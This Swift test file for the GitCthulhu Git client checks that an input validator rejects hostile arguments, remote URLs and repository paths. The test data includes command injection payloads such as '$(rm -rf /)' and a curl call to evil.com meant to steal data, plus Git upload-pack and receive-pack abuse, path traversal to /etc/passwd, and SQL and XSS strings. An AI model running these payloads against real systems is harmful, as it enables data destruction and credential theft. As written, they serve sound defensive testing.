//
// GitInputValidatorAdvancedTests.swift
// GitCthulhu
//
// Created by GitCthulhu Team on 2025-07-12.
//

import Foundation
@testable import GitCore
import Testing

struct GitInputValidatorAdvancedTests {
    // MARK: - Advanced Edge Cases

    @Test("Complex SQL injection patterns")
    func complexSQLInjectionPatterns() async throws {
        // These patterns contain dangerous characters and should be rejected
        let dangerousSqlPatterns = [
            "'; DROP TABLE users; --", // Contains semicolon
            "test | rm -rf /", // Contains pipe
            "test & malicious", // Contains ampersand
            "test `evil`" // Contains backtick
        ]

        for pattern in dangerousSqlPatterns {
            #expect(throws: GitError.self) {
                try GitInputValidator.validateArguments([pattern])
            }
        }

        // These patterns don't contain dangerous characters but are still SQL-like
        let safeSqlPatterns = [
            "' OR '1'='1", // No dangerous chars, will pass
            "' UNION SELECT password FROM users WHERE '1'='1" // No dangerous chars, will pass
        ]

        for pattern in safeSqlPatterns {
            #expect(throws: Never.self) {
                try GitInputValidator.validateArguments([pattern])
            }
        }
    }

    @Test("Nested shell command injection")
    func nestedShellCommandInjection() async throws {
        let shellPatterns = [
            "$(rm -rf /)",
            "`curl evil.com/steal`",
            "${IFS}cat${IFS}/etc/passwd",
            "$(echo 'malicious' > /dev/null && rm -rf /)"
        ]

        for pattern in shellPatterns {
            #expect(throws: GitError.self) {
                try GitInputValidator.validateArguments([pattern])
            }
        }
    }

    @Test("Unicode and encoding attacks")
    func unicodeAndEncodingAttacks() async throws {
        let unicodeAttacks = [
            "../../etc/passwd",
            "%2e%2e%2f%2e%2e%2f",
            "\u{0000}",
            "\u{001b}[31mEvil\u{001b}[0m",
            "＜script＞alert('xss')＜/script＞"
        ]

        for attack in unicodeAttacks {
            #expect(throws: GitError.self) {
                try GitInputValidator.validateRemoteURL(attack)
            }
        }
    }

    @Test("Protocol smuggling attempts")
    func protocolSmugglingAttempts() async throws {
        // These should be rejected due to dangerous protocols
        let dangerousProtocols = [
            "file:///etc/passwd",
            "ftp://anonymous@evil.com/upload/"
        ]

        for attempt in dangerousProtocols {
            #expect(throws: GitError.self) {
                try GitInputValidator.validateRemoteURL(attempt)
            }
        }

        // These have allowed protocols and will pass current validation
        let allowedButSuspicious = [
            "https://example.com#@evil.com/", // https is allowed
            "git://user:pass@evil.com/repo.git", // git:// is allowed
            "ssh://git@github.com:evil.com/repo.git" // ssh:// is allowed
        ]

        for attempt in allowedButSuspicious {
            #expect(throws: Never.self) {
                let result = try GitInputValidator.validateRemoteURL(attempt)
                #expect(!result.isEmpty)
            }
        }
    }

    @Test("Performance with large inputs")
    func performanceWithLargeInputs() async throws {
        let largeInput = String(repeating: "a", count: 10000)

        #expect(throws: GitError.self) {
            try GitInputValidator.sanitizeCommitMessage(largeInput)
        }
    }

    @Test("Concurrent validation stress test")
    func concurrentValidationStressTest() async throws {
        let testInputs = [
            "normal-input",
            "malicious; rm -rf /",
            "$(dangerous)",
            "valid-branch-name",
            "../../../etc/passwd"
        ]

        await withTaskGroup(of: Void.self) { group in
            for _ in 0 ..< 50 {
                group.addTask {
                    for input in testInputs {
                        do {
                            try GitInputValidator.validateArguments([input])
                        } catch {
                            // Expected for malicious inputs
                        }
                    }
                }
            }
        }

        #expect(true)
    }

    // MARK: - Real-world Attack Vectors

    @Test("Real Git command injections")
    func realGitCommandInjections() async throws {
        // These should be caught by suspicious pattern detection
        let suspiciousAttacks = [
            "--upload-pack=evil.sh", // Caught by suspicious pattern
            "--exec=rm -rf /", // Caught by suspicious pattern
            "--receive-pack=/bin/sh" // Caught by suspicious pattern
        ]

        for attack in suspiciousAttacks {
            #expect(throws: GitError.self) {
                try GitInputValidator.validateArguments([attack])
            }
        }

        // This contains dangerous characters and should be rejected
        let characterBasedAttacks = [
            "-c core.autocrlf=false -c core.editor=`touch /tmp/pwned`" // Contains backticks which are dangerous
        ]

        for attack in characterBasedAttacks {
            #expect(throws: GitError.self) {
                try GitInputValidator.validateArguments([attack])
            }
        }
    }

    @Test("Path traversal variations")
    func pathTraversalVariations() async throws {
        let traversalPatterns = [
            "../../../etc/passwd",
            "..\\\\..\\\\..\\\\windows\\\\system32\\\\",
            ".././.././.././etc/passwd",
            "%2e%2e%2fetc%2fpasswd",
            "....//....//etc/passwd",
            "/var/www/../../etc/passwd"
        ]

        for pattern in traversalPatterns {
            #expect(throws: GitError.self) {
                try GitInputValidator.validateRepositoryPath(pattern)
            }
        }
    }

    @Test("Network protocol abuse")
    func networkProtocolAbuse() async throws {
        let protocolAbuse = [
            "file:///proc/self/environ",
            "ftp://evil.com/upload/secrets.txt",
            "ldap://evil.com/cn=admin",
            "gopher://evil.com:70/1",
            "dict://evil.com:2628/show:banner"
        ]

        for `protocol` in protocolAbuse {
            #expect(throws: GitError.self) {
                try GitInputValidator.validateRemoteURL(`protocol`)
            }
        }
    }
}
